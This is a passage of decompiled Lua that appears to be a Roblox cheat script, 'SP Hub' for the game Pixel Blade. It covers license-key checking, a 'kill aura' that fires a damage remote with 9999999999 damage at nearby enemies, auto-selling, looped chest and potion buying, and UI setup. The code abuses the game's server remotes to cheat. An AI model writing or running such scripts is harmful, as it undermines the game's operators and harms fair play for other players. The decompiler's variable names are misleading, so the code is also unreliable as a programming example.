                                                    if failed_to_contact_verification_server ~= nil then
                                                        server_returned_empty_response = failed_to_contact_verification_server.time_left
                                                    else
                                                        server_returned_empty_response = nil
                                                    end
                                                    if server_returned_empty_response then
                                                        server_returned_empty_response = tostring
                                                        if failed_to_contact_verification_server ~= nil then
                                                            decode_error = failed_to_contact_verification_server.time_left
                                                        else
                                                            decode_error = nil
                                                        end
                                                        server_returned_empty_response = server_returned_empty_response(decode_error)
                                                        decode_error = "s"
                                                        server_returned_empty_response = server_returned_empty_response .. decode_error
                                                        if not server_returned_empty_response then
                                                            server_returned_empty_response = "Active"
                                                        end
                                                    else
                                                        server_returned_empty_response = "Active"
                                                    end
                                                end
                                                decode_error = true
                                                failed_to_parse_api_response = server_returned_empty_response
                                                if failed_to_contact_verification_server ~= nil then
                                                    expires_2 = failed_to_contact_verification_server.expires
                                                else
                                                    expires_2 = nil
                                                end
                                                if not expires_2 then
                                                    expires_2 = os
                                                    if expires_2 ~= nil then
                                                        expires_2 = expires_2.time
                                                    else
                                                        expires_2 = nil
                                                    end
                                                    expires_2 = (expires_2()) + (315360000.0)
                                                end
                                                return decode_error, failed_to_parse_api_response, expires_2
                                            else
                                                server_returned_empty_response = false
                                                decode_error = tostring
                                                if failed_to_contact_verification_server ~= nil then
                                                    failed_to_parse_api_response = failed_to_contact_verification_server.reason
                                                else
                                                    failed_to_parse_api_response = nil
                                                end
                                                if not failed_to_parse_api_response then
                                                    if failed_to_contact_verification_server ~= nil then
                                                        failed_to_parse_api_response = failed_to_contact_verification_server.code
                                                    else
                                                        failed_to_parse_api_response = nil
                                                    end
                                                    if not failed_to_parse_api_response then
                                                        failed_to_parse_api_response = "Invalid"
                                                    end
                                                end
                                                decode_error = decode_error(failed_to_parse_api_response)
                                                failed_to_parse_api_response = tostring
                                                if failed_to_contact_verification_server ~= nil then
                                                    expires_2 = failed_to_contact_verification_server.error
                                                else
                                                    expires_2 = nil
                                                end
                                                if not expires_2 then
                                                    expires_2 = "Invalid Key"
                                                end
                                                pack_result_5 = pack(failed_to_parse_api_response(expires_2))
                                                if pack_result_5.n >= 1 then
                                                    failed_to_parse_api_response = pack_result_5[1]
                                                end
                                                if pack_result_5.n >= 2 then
                                                    expires_2 = pack_result_5[2]
                                                end
                                                return server_returned_empty_response, decode_error, unpack(pack_result_5, 1, pack_result_5.n)
                                            end
                                        end
                                    else
                                        server_returned_empty_response = false
                                        decode_error = "Decode Error"
                                        failed_to_parse_api_response = "Failed to parse API response"
                                        return server_returned_empty_response, decode_error, failed_to_parse_api_response
                                    end
                                else
                                    server_returned_empty_response = false
                                    decode_error = "Decode Error"
                                    failed_to_parse_api_response = "Failed to parse API response"
                                    return server_returned_empty_response, decode_error, failed_to_parse_api_response
                                end
                            end
                        else
                            connection_error = false
                            failed_to_contact_verification_server = "Empty Response"
                            server_returned_empty_response = "Server returned empty response"
                            return connection_error, failed_to_contact_verification_server, server_returned_empty_response
                        end
                    end
                else
                    body_2 = false
                    connection_error = "Connection Error"
                    failed_to_contact_verification_server = "Failed to contact verification server"
                    return body_2, connection_error, failed_to_contact_verification_server
                end
            end
        end
    end
    pcall_2 = pcall
    local val_27 = spawn_2
    pcall_2(function()
        local key_file
        local local_1_result_2 = isfile
        local key_file_2 = val_27
        if key_file_2 ~= nil then
            key_file_2 = key_file_2.KEY_FILE
        else
            key_file_2 = nil
        end
        local_1_result_2 = local_1_result_2(key_file_2)
        if local_1_result_2 then
            local_1_result_2 = val_27
            key_file_2 = readfile
            key_file = val_27
            if key_file ~= nil then
                key_file = key_file.KEY_FILE
            else
                key_file = nil
            end
            key_file_2 = key_file_2(key_file)
            if local_1_result_2 then
                local_1_result_2.savedKey = key_file_2
            end
        end
        return
    end)
    local val_28 = workspace_2
    pcall_2 = function()
        local find_first_child_3 = val_28
        local value_4 = find_first_child_3
        if find_first_child_3 then
            find_first_child_3 = find_first_child_3.FindFirstChild
        else
            find_first_child_3 = nil
        end
        local world_type = "worldType"
        find_first_child_3 = find_first_child_3(value_4, world_type)
        if find_first_child_3 then
            if find_first_child_3 ~= nil then
                value_4 = find_first_child_3.Value
            else
                value_4 = nil
            end
            if value_4 then
                value_4 = tostring
                if find_first_child_3 ~= nil then
                    world_type = find_first_child_3.Value
                else
                    world_type = nil
                end
                return value_4(world_type)
            else
                value_4 = nil
                return value_4
            end
        else
            value_4 = nil
            return value_4
        end
    end
    local capture_1_35329_2, val_29, val_30 = tbl_9, players, pcall_2
    handler_4 = function(argument_1)
        local is_a, find_first_child_4, model_2, humanoid_root_part_2
        if argument_1 then
            find_first_child_4 = argument_1
            if argument_1 then
                is_a = argument_1.IsA
            else
                is_a = nil
            end
            model_2 = "Model"
            is_a = is_a(find_first_child_4, model_2)
            if is_a then
                is_a = capture_1_35329_2.value
                if argument_1 ~= is_a then
                    is_a = val_29
                    find_first_child_4 = is_a
                    if is_a then
                        is_a = is_a.GetPlayerFromCharacter
                    else
                        is_a = nil
                    end
                    model_2 = argument_1
                    is_a = is_a(find_first_child_4, model_2)
                    if is_a then
                        is_a = false
                        return is_a
                    else
                        is_a = val_30()
                        if (is_a == "CrimsonAbyss") then
                            if argument_1 ~= nil then
                                is_a = argument_1.Name
                            else
                                is_a = nil
                            end
                            if (is_a == "Teeth_Trap") then
                                is_a = false
                                return is_a
                            else
                                find_first_child_4 = argument_1
                                if argument_1 then
                                    is_a = argument_1.FindFirstChild
                                else
                                    is_a = nil
                                end
                                is_a = is_a(find_first_child_4, "Humanoid")
                                model_2 = argument_1
                                if argument_1 then
                                    find_first_child_4 = argument_1.FindFirstChild
                                else
                                    find_first_child_4 = nil
                                end
                                humanoid_root_part_2 = "HumanoidRootPart"
                                find_first_child_4 = find_first_child_4(model_2, humanoid_root_part_2)
                                if not is_a then
                                    model_2 = is_a
                                else
                                    if not find_first_child_4 then
                                        model_2 = find_first_child_4
                                    else
                                        if is_a ~= nil then
                                            model_2 = is_a.Health
                                        else
                                            model_2 = nil
                                        end
                                        if (0.0 < model_2) then
                                            humanoid_root_part_2 = is_a
                                            if is_a then
                                                model_2 = is_a.GetState
                                            else
                                                model_2 = nil
                                            end
                                            model_2 = model_2(humanoid_root_part_2)
                                            humanoid_root_part_2 = Enum.HumanoidStateType
                                            if humanoid_root_part_2 ~= nil then
                                                humanoid_root_part_2 = humanoid_root_part_2.Dead
                                            else
                                                humanoid_root_part_2 = nil
                                            end
                                            if (model_2 == humanoid_root_part_2) then
                                                model_2 = false
                                            else
                                                model_2 = true
                                            end
                                        else
                                            model_2 = false
                                        end
                                    end
                                end
                                return model_2
                            end
                        else
                            find_first_child_4 = argument_1
                            if argument_1 then
                                is_a = argument_1.FindFirstChild
                            else
                                is_a = nil
                            end
                            is_a = is_a(find_first_child_4, "Humanoid")
                            model_2 = argument_1
                            if argument_1 then
                                find_first_child_4 = argument_1.FindFirstChild
                            else
                                find_first_child_4 = nil
                            end
                            humanoid_root_part_2 = "HumanoidRootPart"
                            find_first_child_4 = find_first_child_4(model_2, humanoid_root_part_2)
                            if not is_a then
                                model_2 = is_a
                            else
                                if not find_first_child_4 then
                                    model_2 = find_first_child_4
                                else
                                    if is_a ~= nil then
                                        model_2 = is_a.Health
                                    else
                                        model_2 = nil
                                    end
                                    if (0.0 < model_2) then
                                        humanoid_root_part_2 = is_a
                                        if is_a then
                                            model_2 = is_a.GetState
                                        else
                                            model_2 = nil
                                        end
                                        model_2 = model_2(humanoid_root_part_2)
                                        humanoid_root_part_2 = Enum.HumanoidStateType
                                        if humanoid_root_part_2 ~= nil then
                                            humanoid_root_part_2 = humanoid_root_part_2.Dead
                                        else
                                            humanoid_root_part_2 = nil
                                        end
                                        if (model_2 == humanoid_root_part_2) then
                                            model_2 = false
                                        else
                                            model_2 = true
                                        end
                                    else
                                        model_2 = false
                                    end
                                end
                            end
                            return model_2
                        end
                    end
                else
                    is_a = false
                    return is_a
                end
            else
                is_a = false
                return is_a
            end
        else
            is_a = false
            return is_a
        end
    end
    local capture_1_36353_2, val_31, val_32 = tbl_10, workspace_2, handler_4
    handler_5 = function(argument_1)
        local pack_result_6
        local pairs_2, get_children, pack_result_7, pack_result_8, pack_result_9, pack_result_10, pack_result_11, pack_result_12, pack_result_13
        local tbl_39 = capture_1_36353_2.value
        if not tbl_39 then
            tbl_39 = {}
            return tbl_39
        else
            tbl_39 = {}
            pairs_2 = pairs
            get_children = val_31
            pack_result_7 = get_children
            if get_children then
                get_children = get_children.GetChildren
            else
                get_children = nil
            end
            pack_result_6 = pack(get_children(pack_result_7))
            if pack_result_6.n >= 1 then
                get_children = pack_result_6[1]
            end
            if pack_result_6.n >= 2 then
                pack_result_7 = pack_result_6[2]
            end
            if pack_result_6.n >= 3 then
                pack_result_8 = pack_result_6[3]
            end
            if pack_result_6.n >= 4 then
                pack_result_9 = pack_result_6[4]
            end
            if pack_result_6.n >= 5 then
                pack_result_10 = pack_result_6[5]
            end
            if pack_result_6.n >= 6 then
                pack_result_11 = pack_result_6[6]
            end
            if pack_result_6.n >= 7 then
                pack_result_12 = pack_result_6[7]
            end
            if pack_result_6.n >= 8 then
                pack_result_13 = pack_result_6[8]
            end
            pairs_2 = pairs_2(unpack(pack_result_6, 1, pack_result_6.n))
            while true do
                pack_result_8 = pairs_2(get_children, pack_result_7)
                if pack_result_8 ~= nil then
                    pack_result_7 = pack_result_8
                    pack_result_10 = val_32
                    pack_result_11 = pack_result_9
                    pack_result_10 = pack_result_10(pack_result_11)
                    if pack_result_10 then
                        pack_result_11 = pack_result_9
                        if pack_result_9 then
                            pack_result_10 = pack_result_9.FindFirstChild
                        else
                            pack_result_10 = nil
                        end
                        pack_result_12 = "HumanoidRootPart"
                        pack_result_10 = pack_result_10(pack_result_11, pack_result_12)
                        if pack_result_10 then
                            pack_result_11 = capture_1_36353_2.value
                            if pack_result_11 ~= nil then
                                pack_result_11 = pack_result_11.Position
                            else
                                pack_result_11 = nil
                            end
                            if pack_result_10 ~= nil then
                                pack_result_12 = pack_result_10.Position
                            else
                                pack_result_12 = nil
                            end
                            pack_result_11 = (pack_result_11) - (pack_result_12)
                            if pack_result_11 ~= nil then
                                pack_result_11 = pack_result_11.Magnitude
                            else
                                pack_result_11 = nil
                            end
                            if (pack_result_11 <= argument_1) then
                                pack_result_11 = table
                                if pack_result_11 ~= nil then
                                    pack_result_11 = pack_result_11.insert
                                else
                                    pack_result_11 = nil
                                end
                                pack_result_12 = tbl_39
                                pack_result_13 = pack_result_9
                                pack_result_11(pack_result_12, pack_result_13)
                            end
                        end
                    end
                else
                    break
                end
            end
            return tbl_39
        end
    end
    tbl_16.value = 0.0
    local capture_1_37633_2, capture_1_37634_2, capture_1_37635_2, val_33, val_34 = tbl_16, tbl_12, tbl_13, handler_5, tbl_3
    handler_6 = function()
        local in_cutscene, val_35, val_36, in_cutscene_result, val_37, find_first_child_5, pcall_4, humanoid
        local tick_result = tick()
        local value_5 = capture_1_37633_2.value
        tick_result = (tick_result) - (value_5)
        if (tick_result < 0.05) then
            return
        else
            capture_1_37633_2.value = tick()
            tick_result = capture_1_37634_2.value
            if tick_result then
                tick_result = capture_1_37635_2.value
                if not tick_result then
                    return
                else
                    tick_result = workspace
                    value_5 = tick_result
                    tick_result = tick_result.FindFirstChild
                    in_cutscene = "inCutscene"
                    tick_result = tick_result(value_5, in_cutscene)
                    if tick_result then
                        if tick_result ~= nil then
                            value_5 = tick_result.Value
                        else
                            value_5 = nil
                        end
                        if value_5 then
                            return
                        else
                            value_5 = val_33
                            in_cutscene = val_34
                            if in_cutscene ~= nil then
                                in_cutscene = in_cutscene.AuraRadius
                            else
                                in_cutscene = nil
                            end
                            value_5 = value_5(in_cutscene)
                            in_cutscene = #(value_5)
                            if (0.0 < in_cutscene) then
                                in_cutscene = pcall
                                local capture_19_9217_2 = capture_1_37634_2
                                in_cutscene(function()
                                    local fire_server = capture_19_9217_2.value
                                    local val_38 = fire_server
                                    if fire_server then
                                        fire_server = fire_server.FireServer
                                    else
                                        fire_server = nil
                                    end
                                    fire_server(val_38)
                                    return
                                end)
                                in_cutscene = pairs
                                val_35 = value_5
                                in_cutscene = in_cutscene(val_35)
                                while true do
                                    in_cutscene_result = in_cutscene(val_35, val_36)
                                    if in_cutscene_result ~= nil then
                                        val_36 = in_cutscene_result
                                        pcall_4 = val_37
                                        if val_37 then
                                            find_first_child_5 = val_37.FindFirstChild
                                        else
                                            find_first_child_5 = nil
                                        end
                                        humanoid = "Humanoid"
                                        find_first_child_5 = find_first_child_5(pcall_4, humanoid)
                                        if find_first_child_5 then
                                            pcall_4 = pcall
                                            local capture_19_12545_2, val_39 = capture_1_37635_2, find_first_child_5
                                            humanoid = function()
                                                local fire_server_2 = capture_19_12545_2.value
                                                local val_40 = fire_server_2
                                                if fire_server_2 then
                                                    fire_server_2 = fire_server_2.FireServer
                                                else
                                                    fire_server_2 = nil
                                                end
                                                fire_server_2(val_40, val_39, 9999999999.0, {}, 0.0)
                                                return
                                            end
                                            pcall_4(humanoid)
                                        end
                                    else
                                        break
                                    end
                                end
                            end
                            return
                        end
                    else
                        value_5 = val_33
                        in_cutscene = val_34
                        if in_cutscene ~= nil then
                            in_cutscene = in_cutscene.AuraRadius
                        else
                            in_cutscene = nil
                        end
                        value_5 = value_5(in_cutscene)
                        in_cutscene = #(value_5)
                        if (0.0 < in_cutscene) then
                            in_cutscene = pcall
                            local capture_19_9217_2 = capture_1_37634_2
                            in_cutscene(function()
                                local fire_server_3 = capture_19_9217_2.value
                                local val_41 = fire_server_3
                                if fire_server_3 then
                                    fire_server_3 = fire_server_3.FireServer
                                else
                                    fire_server_3 = nil
                                end
                                fire_server_3(val_41)
                                return
                            end)
                            in_cutscene = pairs
                            val_35 = value_5
                            in_cutscene = in_cutscene(val_35)
                            while true do
                                in_cutscene_result = in_cutscene(val_35, val_36)
                                if in_cutscene_result ~= nil then
                                    val_36 = in_cutscene_result
                                    pcall_4 = val_37
                                    if val_37 then
                                        find_first_child_5 = val_37.FindFirstChild
                                    else
                                        find_first_child_5 = nil
                                    end
                                    humanoid = "Humanoid"
                                    find_first_child_5 = find_first_child_5(pcall_4, humanoid)
                                    if find_first_child_5 then
                                        pcall_4 = pcall
                                        local capture_19_12545_2, val_42 = capture_1_37635_2, find_first_child_5
                                        humanoid = function()
                                            local fire_server_4 = capture_19_12545_2.value
                                            local val_43 = fire_server_4
                                            if fire_server_4 then
                                                fire_server_4 = fire_server_4.FireServer
                                            else
                                                fire_server_4 = nil
                                            end
                                            fire_server_4(val_43, val_42, 9999999999.0, {}, 0.0)
                                            return
                                        end
                                        pcall_4(humanoid)
                                    end
                                else
                                    break
                                end
                            end
                        end
                        return
                    end
                end
            end
            return
        end
    end
    tbl_4 = {
        ['Iron Sword'] = "SWORD/Iron Sword",
        ['Gold Sword'] = "SWORD/Gold Sword",
        ['Ruby Sword'] = "SWORD/Ruby Sword",
        ['Saphire Sword'] = "SWORD/Saphire Sword",
        ['Emerald Sword'] = "SWORD/Emerald Sword",
        ['Obsidian Sword'] = "SWORD/Obsidian Sword",
        ['Crystal Sword'] = "SWORD/Crystal Sword",
        ['Demon Sword'] = "SWORD/Demon Sword",
        ['Angel Sword'] = "SWORD/Angel Sword",
        ['Dragon Sword'] = "SWORD/Dragon Sword",
        ['Titan Sword'] = "SWORD/Titan Sword",
        ['Void Sword'] = "SWORD/Void Sword",
        ['Hero Sword'] = "SWORD/Hero Sword",
        ['Sphinx Sword'] = "SWORD/Sphinx Sword",
        ['Skull Sword'] = "SWORD/Skull Sword",
        ['Ancient Sword'] = "SWORD/Ancient Sword",
        ['Snow Sword'] = "SWORD/Snow Sword",
        ['Yeti Sword'] = "SWORD/Yeti Sword",
        ['Viking Sword'] = "SWORD/Viking Sword",
        ['Shadow Sword'] = "SWORD/Shadow Sword",
        ['CrimsonAbyss Sword'] = "SWORD/CrimsonAbyss Sword",
        ['DarkVoid Sword'] = "SWORD/DarkVoid Sword",
        ['VoidSpirit Sword'] = "SWORD/VoidSpirit Sword",
        ['Lava Sword'] = "SWORD/Lava Sword",
        ['Slime Common'] = "SLIME/Slime/Common",
        ['Slime Rare'] = "SLIME/Slime/Rare",
        ['Super Slime Epic'] = "SLIME/Super Slime/Epic",
        ['Super Slime Rare'] = "SLIME/Super Slime/Rare",
        ['Ultimate Slime Epic'] = "SLIME/Ultimate Slime/Epic",
        ['Ultimate Slime Legendary'] = "SLIME/Ultimate Slime/Legendary",
        ['Golem Common'] = "GOLEM/Golem/Common",
        ['Golem Rare'] = "GOLEM/Golem/Rare",
        ['Super Golem Epic'] = "GOLEM/Super Golem/Epic",
        ['Super Golem Rare'] = "GOLEM/Super Golem/Rare",
        ['Ultimate Golem Epic'] = "GOLEM/Ultimate Golem/Epic",
        ['Ultimate Golem Legendary'] = "GOLEM/Ultimate Golem/Legendary",
        ['Ghost Common'] = "GHOST/Ghost/Common",
        ['Ghost Rare'] = "GHOST/Ghost/Rare",
        ['Super Ghost Epic'] = "GHOST/Super Ghost/Epic",
        ['Super Ghost Rare'] = "GHOST/Super Ghost/Rare",
        ['Ultimate Ghost Epic'] = "GHOST/Ultimate Ghost/Epic",
        ['Ultimate Ghost Legendary'] = "GHOST/Ultimate Ghost/Legendary",
        ['Demon Common'] = "DEMON/Demon/Common",
        ['Demon Rare'] = "DEMON/Demon/Rare",
        ['Super Demon Epic'] = "DEMON/Super Demon/Epic",
        ['Super Demon Rare'] = "DEMON/Super Demon/Rare",
        ['Ultimate Demon Epic'] = "DEMON/Ultimate Demon/Epic",
        ['Ultimate Demon Legendary'] = "DEMON/Ultimate Demon/Legendary",
        ['Axe Common'] = "AXE/Axe/Common",
        ['Axe Rare'] = "AXE/Axe/Rare",
        ['Super Axe Epic'] = "AXE/Super Axe/Epic",
        ['Super Axe Rare'] = "AXE/Super Axe/Rare",
        ['Ultimate Axe Epic'] = "AXE/Ultimate Axe/Epic",
        ['Ultimate Axe Legendary'] = "AXE/Ultimate Axe/Legendary",
        ['Charm Common'] = "CHARM/Charm/Common",
        ['Charm Rare'] = "CHARM/Charm/Rare",
        ['Super Charm Epic'] = "CHARM/Super Charm/Epic",
        ['Super Charm Rare'] = "CHARM/Super Charm/Rare",
        ['Ultimate Charm Epic'] = "CHARM/Ultimate Charm/Epic",
        ['Ultimate Charm Legendary'] = "CHARM/Ultimate Charm/Legendary",
    }
    tbl_17.value = {}
    local capture_1_55041_2, val_44 = tbl_17, tbl_4
    handler_7 = function(argument_1)
        local local_2_result_3, local_2_result_4, val_45, val_46, table_2, val_47, val_48
        capture_1_55041_2.value = {}
        local pairs_3 = pairs
        local val_49 = argument_1
        pairs_3 = pairs_3(val_49)
        while true do
            local_2_result_4 = pairs_3(val_49, local_2_result_3)
            if local_2_result_4 ~= nil then
                local_2_result_3 = local_2_result_4
                if (val_45 == true) then
                    val_46 = val_44
                    if val_46 ~= nil then
                        val_46 = val_46[local_2_result_4]
                    else
                        val_46 = nil
                    end
                    if val_46 then
                        table_2 = table
                        if table_2 ~= nil then
                            table_2 = table_2.insert
                        else
                            table_2 = nil
                        end
                        val_47 = capture_1_55041_2.value
                        val_48 = val_46
                        table_2(val_47, val_48)
                    end
                end
            else
                break
            end
        end
        return
    end
    local val_50, val_51, capture_1_55811_2 = replicated_storage, tbl_4, tbl_17
    handler_8 = function(argument_1)
        local handler_19, local_4_result, local_4_result_2, val_52, table_3, val_53, val_54
        local find_first_child_6 = val_50
        local tbl_40 = find_first_child_6
        if find_first_child_6 then
            find_first_child_6 = find_first_child_6.FindFirstChild
        else
            find_first_child_6 = nil
        end
        local remotes_3 = "remotes"
        find_first_child_6 = find_first_child_6(tbl_40, remotes_3)
        if find_first_child_6 then
            find_first_child_6 = val_50
            if find_first_child_6 ~= nil then
                find_first_child_6 = find_first_child_6.remotes
            else
                find_first_child_6 = nil
            end
            tbl_40 = find_first_child_6
            if find_first_child_6 then
                find_first_child_6 = find_first_child_6.FindFirstChild
            else
                find_first_child_6 = nil
            end
            remotes_3 = "sell"
            find_first_child_6 = find_first_child_6(tbl_40, remotes_3)
        end
        if not find_first_child_6 then
            return
        else
            tbl_40 = {}
            if argument_1 then
                remotes_3 = pairs
                handler_19 = val_51
                remotes_3 = remotes_3(handler_19)
                while true do
                    local_4_result_2 = remotes_3(handler_19, local_4_result)
                    if local_4_result_2 ~= nil then
                        local_4_result = local_4_result_2
                        table_3 = table
                        if table_3 ~= nil then
                            table_3 = table_3.insert
                        else
                            table_3 = nil
                        end
                        val_53 = tbl_40
                        val_54 = val_52
                        table_3(val_53, val_54)
                    else
                        break
                    end
                end
            else
                tbl_40 = capture_1_55811_2.value
            end
            remotes_3 = #(tbl_40)
            if (0.0 < remotes_3) then
                remotes_3 = pcall
                local val_55, val_56 = find_first_child_6, tbl_40
                handler_19 = function()
                    local fire_server_5 = val_55
                    local val_57 = fire_server_5
                    if fire_server_5 then
                        fire_server_5 = fire_server_5.FireServer
                    else
                        fire_server_5 = nil
                    end
                    fire_server_5(val_57, val_56)
                    return
                end
                remotes_3(handler_19)
            end
            return
        end
    end
    tbl_5 = {
        ['Slime Chest'] = "Slime",
        ['Golem Chest'] = "Golem",
        ['Ghost Chest'] = "Ghost",
        ['Demon Chest'] = "Demon",
        ['Axe Chest'] = "Axe",
        ['Charm Chest'] = "Charm",
    }
    slime = "Slime"
    tbl_18.value = 1.0
    local val_58, val_59, val_60, capture_1_59140_2 = replicated_storage, tbl_5, slime, tbl_18
    handler_9 = function()
        local val_61, pcall_5
        local index_33, limit_33, step_33
        local find_first_child_7 = val_58
        local val_62 = find_first_child_7
        if find_first_child_7 then
            find_first_child_7 = find_first_child_7.FindFirstChild
        else
            find_first_child_7 = nil
        end
        local remotes_4 = "remotes"
        find_first_child_7 = find_first_child_7(val_62, remotes_4)
        if find_first_child_7 then
            find_first_child_7 = val_58
            if find_first_child_7 ~= nil then
                find_first_child_7 = find_first_child_7.remotes
            else
                find_first_child_7 = nil
            end
            val_62 = find_first_child_7
            if find_first_child_7 then
                find_first_child_7 = find_first_child_7.FindFirstChild
            else
                find_first_child_7 = nil
            end
            remotes_4 = "buyChest"
            find_first_child_7 = find_first_child_7(val_62, remotes_4)
        end
        if not find_first_child_7 then
            return
        else
            val_62 = val_59
            remotes_4 = val_60
            if val_62 ~= nil then
                val_62 = val_62[remotes_4]
            else
                val_62 = nil
            end
            if val_62 then
                remotes_4 = 1.0
                val_61 = capture_1_59140_2.value
                remotes_4 = remotes_4 - 1.0
                while true do
                    step_33 = 1.0
                    index_33 = remotes_4 + step_33
                    limit_33 = val_61
                    remotes_4 = index_33
                    if (step_33 > 0 and index_33 <= limit_33) or (step_33 <= 0 and index_33 >= limit_33) then
                        pcall_5 = pcall
                        local val_63, val_64 = find_first_child_7, val_62
                        pcall_5(function()
                            local fire_server_6 = val_63
                            local val_65 = fire_server_6
                            if fire_server_6 then
                                fire_server_6 = fire_server_6.FireServer
                            else
                                fire_server_6 = nil
                            end
                            fire_server_6(val_65, val_64)
                            return
                        end)
                        pcall_5 = task.wait
                        pcall_5(0.05)
                    else
                        break
                    end
                end
            end
            return
        end
    end
    tbl_6 = {
        ['Health Flask (20)'] = "HealthFlask",
        ['Energy Flask (30)'] = "EnergyFlask",
        ['Dragon Flask (60)'] = "DragonFlask",
    }
    tbl_19.value = 1.0
    tbl_20.value = {}
    do
        local capture_1_61953, val_66 = tbl_20, tbl_6
        handler_10 = function(argument_1)
            local local_2_result_5, local_2_result_6, val_67, val_68, table_4, val_69, val_70
            capture_1_61953.value = {}
            local pairs_4 = pairs
            local val_71 = argument_1
            pairs_4 = pairs_4(val_71)
            while true do
                local_2_result_6 = pairs_4(val_71, local_2_result_5)
                if local_2_result_6 ~= nil then
                    local_2_result_5 = local_2_result_6
                    if (val_67 == true) then
                        val_68 = val_66
                        if val_68 ~= nil then
                            val_68 = val_68[local_2_result_6]
                        else
                            val_68 = nil
                        end
                        if val_68 then
                            table_4 = table
                            if table_4 ~= nil then
                                table_4 = table_4.insert
                            else
                                table_4 = nil
                            end
                            val_69 = capture_1_61953.value
                            val_70 = val_68
                            table_4(val_69, val_70)
                        end
                    end
                else
                    break
                end
            end
            return
        end
    end
    do
        local val_72, capture_1_62722, capture_1_62723 = replicated_storage, tbl_20, tbl_19
        handler_11 = function()
            local local_2_result_7, local_2_result_8, val_73, value_6, val_74, pcall_6
            local index_32, limit_32, step_32
            local find_first_child_8 = val_72
            local pairs_5 = find_first_child_8
            if find_first_child_8 then
                find_first_child_8 = find_first_child_8.FindFirstChild
            else
                find_first_child_8 = nil
            end
            local remotes_5 = "remotes"
            find_first_child_8 = find_first_child_8(pairs_5, remotes_5)
            if find_first_child_8 then
                find_first_child_8 = val_72
                if find_first_child_8 ~= nil then
                    find_first_child_8 = find_first_child_8.remotes
                else
                    find_first_child_8 = nil
                end
                pairs_5 = find_first_child_8
                if find_first_child_8 then
                    find_first_child_8 = find_first_child_8.FindFirstChild
                else
                    find_first_child_8 = nil
                end
                remotes_5 = "buyPotion"
                find_first_child_8 = find_first_child_8(pairs_5, remotes_5)
            end
            if not find_first_child_8 then
                return
            else
                pairs_5 = pairs
                remotes_5 = capture_1_62722.value
                pairs_5 = pairs_5(remotes_5)
                while true do
                    local_2_result_8 = pairs_5(remotes_5, local_2_result_7)
                    if local_2_result_8 ~= nil then
                        local_2_result_7 = local_2_result_8
                        value_6 = 1.0
                        val_74 = capture_1_62723.value
                        value_6 = value_6 - 1.0
                        while true do
                            step_32 = 1.0
                            index_32 = value_6 + step_32
                            limit_32 = val_74
                            value_6 = index_32
                            if (step_32 > 0 and index_32 <= limit_32) or (step_32 <= 0 and index_32 >= limit_32) then
                                pcall_6 = pcall
                                local val_75, val_76 = find_first_child_8, val_73
                                pcall_6(function()
                                    local fire_server_7 = val_75
                                    local val_77 = fire_server_7
                                    if fire_server_7 then
                                        fire_server_7 = fire_server_7.FireServer
                                    else
                                        fire_server_7 = nil
                                    end
                                    fire_server_7(val_77, val_76)
                                    return
                                end)
                                pcall_6 = task.wait
                                pcall_6(0.05)
                            else
                                break
                            end
                        end
                    else
                        break
                    end
                end
                return
            end
        end
    end
    handler_12 = sphub_first_time_path
    if sphub_first_time_path then
        make_window = sphub_first_time_path.MakeWindow
    else
        make_window = nil
    end
    tbl_21.value = {}
    if tbl_21.value then
        tbl_21.value.Name = "SP Hub | Pixel Blade | v1.1"
    end
    if tbl_21.value then
        tbl_21.value.SubTitle = "by SP Hub"
    end
    if tbl_21.value then
        tbl_21.value.IsPremium = true
    end
    if tbl_21.value then
        tbl_21.value.Setting = true
    end
    if tbl_21.value then
        tbl_21.value.Toggle = true
    end
    if tbl_21.value then
        tbl_21.value.Icon = "rbxassetid://83114982417764"
    end
    if tbl_21.value then
        tbl_21.value.ToggleIcon = "rbxassetid://83114982417764"
    end
    make_window = make_window(handler_12, tbl_21.value)
    handler_12 = protectTab
    if not handler_12 then
        handler_12 = function(argument_1, argument_2)
            return argument_1
        end
    end
    tbl_21.value = false
    tbl_22.value = handler
    tbl_23.value = "Lifetime"
    tbl_22.value = tbl_22.value(tbl_23.value)
    tbl_23.value = os
    if tbl_23.value ~= nil then
        tbl_23.value = tbl_23.value.time
    else
        tbl_23.value = nil
    end
    tbl_23.value = tbl_23.value()
    tbl_23.value = (tbl_23.value) + (315360000.0)
    tbl_24.value = false
    tbl_25.value = handler_12
    make_tab_2 = make_window
    if make_window then
        make_tab = make_window.MakeTab
    else
        make_tab = nil
    end
    tbl_7 = {}
    handler_result = handler("Info")
    info = "Info"
    tbl_7[1] = handler_result
    tbl_7[2] = info
    make_tab = make_tab(make_tab_2, tbl_7)
    tbl_25.value = tbl_25.value(make_tab, "Info")
    make_tab_2 = tbl_25.value
    if tbl_25.value then
        make_tab = tbl_25.value.AddSection
    else
        make_tab = nil
    end
    tbl_7 = {}
    pack_result_4 = pack(handler("Language"))
    if pack_result_4.n >= 1 then
        handler_result = pack_result_4[1]
    end
    if pack_result_4.n >= 2 then
        info = pack_result_4[2]
    end
    if pack_result_4.n >= 3 then
        tbl_26.value = pack_result_4[3]
    end
    if pack_result_4.n >= 4 then
        tbl_27.value = pack_result_4[4]
    end
    if pack_result_4.n >= 5 then
        tbl_28.value = pack_result_4[5]
    end
    if pack_result_4.n >= 6 then
        tbl_29.value = pack_result_4[6]
    end
    if pack_result_4.n >= 7 then
        tbl_30.value = pack_result_4[7]
    end
    if pack_result_4.n >= 8 then
        tbl_31.value = pack_result_4[8]
    end
    if pack_result_4.n >= 9 then
        tbl_32.value = pack_result_4[9]
    end
    if pack_result_4.n >= 10 then
        tbl_33.value = pack_result_4[10]
    end
    if pack_result_4.n >= 11 then
        tbl_34.value = pack_result_4[11]
    end
    if pack_result_4.n >= 12 then
        handler_13 = pack_result_4[12]
    end
    if pack_result_4.n >= 13 then
        tbl_35.value = pack_result_4[13]
    end
    if pack_result_4.n >= 14 then
        handler_14 = pack_result_4[14]
    end
    if pack_result_4.n >= 15 then
        tbl_36.value = pack_result_4[15]
    end
    if pack_result_4.n >= 16 then
        handler_result_2 = pack_result_4[16]
    end
    if pack_result_4.n >= 17 then
        handler_result_3 = pack_result_4[17]
    end
    if pack_result_4.n >= 18 then
        connect = pack_result_4[18]
    end
    if pack_result_4.n >= 19 then
        show_aura = pack_result_4[19]
    end
    if pack_result_4.n >= 20 then
        spawn_3 = pack_result_4[20]
    end
    if pack_result_4.n >= 21 then
        handler_15 = pack_result_4[21]
    end
    if pack_result_4.n >= 22 then
        add_toggle = pack_result_4[22]
    end
    if pack_result_4.n >= 23 then
        handler_16 = pack_result_4[23]
    end
    if pack_result_4.n >= 24 then
        fpsboost = pack_result_4[24]
    end
    if pack_result_4.n >= 25 then
        val_2 = pack_result_4[25]
    end
